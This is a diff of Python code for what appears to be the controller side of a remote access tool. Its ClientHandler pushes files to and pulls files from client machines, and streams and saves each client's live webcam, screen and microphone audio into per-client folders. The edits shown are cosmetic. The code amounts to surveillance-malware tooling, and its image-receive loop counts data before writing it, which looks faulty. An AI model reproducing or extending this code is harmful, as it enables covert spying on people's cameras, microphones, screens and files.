@@ -1,20 +1,20 @@
 import os
-import time
-from datetime import datetime
-from IPython.display import clear_output
-import socket
 import sys
 import cv2
-import matplotlib.pyplot as plt
-import pickle
-import numpy as np
-import struct 
 import zlib
-from PIL import Image, ImageOps
-import pyaudio
 import wave
+import time
+import socket
+import pickle
+import struct
+import pyaudio
 import keyboard
 import mute_alsa
+import numpy as np
+from datetime import datetime
+from PIL import Image, ImageOps
+import matplotlib.pyplot as plt
+from IPython.display import clear_output
 
 
 
@@ -22,12 +22,12 @@ class ClientHandler:
 
 
 
-        #sends file from server to client machine
+        # sends file from server to client machine
         def send_file(self, conn, usrFile):
             try:
                 if not os.path.exists(usrFile):
                     print("[-]File does not exist!!!")
-                    conn.send(str(" ").encode()) #get client current working directory
+                    conn.send(str(" ").encode()) # get client current working directory
                 else:
                     fileSize = os.path.getsize(usrFile)
                     conn.send(str(fileSize).encode())
@@ -52,7 +52,7 @@ class ClientHandler:
 
 
 
-        #recieves file from client machine
+        # recieves file from client machine
         def receive_file(self, conn, client_folder, client_id, usrFile):
             usrFile = os.path.join(client_folder, client_id, usrFile)
 
@@ -83,32 +83,33 @@ class ClientHandler:
 
 
 
-        #receives images from the client machine
+        # receives images from the client machine
         def receive_client_image(self, client_folder, client_id, client_sock_object):
             try:
                 image_name = client_sock_object.recv(1024).decode()
                 path = os.path.join(client_folder, client_id, image_name + ".jpg")
 
                 with open(path, 'wb') as file:
-                    fileSize = int(client_sock_object.recv(1024).decode())#accept and decode image file size
+                    fileSize = int(client_sock_object.recv(1024).decode())# accept and decode image file size
                     time.sleep(1)
-                    data = client_sock_object.recv(1024) #accept and decode length of data received
+                    data = client_sock_object.recv(1024) # accept and decode length of data received
                     totalFileRecv = len(data)
-                    #recieve all data until there no more data to receive
+                    # recieve all data until there no more data to receive
                     while totalFileRecv < fileSize:
                         totalFileRecv += len(data)
                         file.write(data)
                         data = client_sock_object.recv(1024)
                     file.close()
-                print("[+]Image received!!!")
+                print("[+]Image saved sucessfully!")
 
-            except:
+            except Exception as e:
                 print("[-]Unable to receive image!!!")
+                # print(e)
 
 
 
 
-        #receives live webcam feed from client, outputs recording live on screen and writes stream to client folder
+        # receives live webcam feed from client, outputs recording live on screen and writes stream to client folder
         def live_webcam_feed(self, conn):
                 cam_data = b""
                 exitSignal = "noexit"
@@ -158,8 +159,7 @@ class ClientHandler:
 
 
 
-
-        #receives live screen feed from client, outputs recording live on screen and writes stream to client folder
+        # receives live screen feed from client, outputs recording live on screen and writes stream to client folder
         def live_screen_feed(self, conn):
             data = b""
             msg_size = ""
@@ -172,7 +172,7 @@ class ClientHandler:
 
                 while True:
                     while len(data) < payload_size:
-                        #print("Recv: {}".format(len(data)))
+                        # print("Recv: {}".format(len(data)))
                         data += conn.recv(60000)
                         if exitSignal == "exit":
                             conn.send(exitSignal.encode())
@@ -208,7 +208,7 @@ class ClientHandler:
 
 
         
-        #receives live audio from client, outputs recording live and write stream to client folder
+        # receives live audio from client, outputs recording live and write stream to client folder
         def live_audio_feed(self, conn, client_folder, client_id):
             current_datetime = datetime.now()
             formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
@@ -224,7 +224,7 @@ class ClientHandler:
             audio_frames = []
 
             exitSignal = "noexit"
-            print("[+] Press q to quit...")
+            print("[+] Press q a few times to quit...")
 
             # open stream object as input & output
             stream = paudio.open(format=FORMAT, channels=channels,
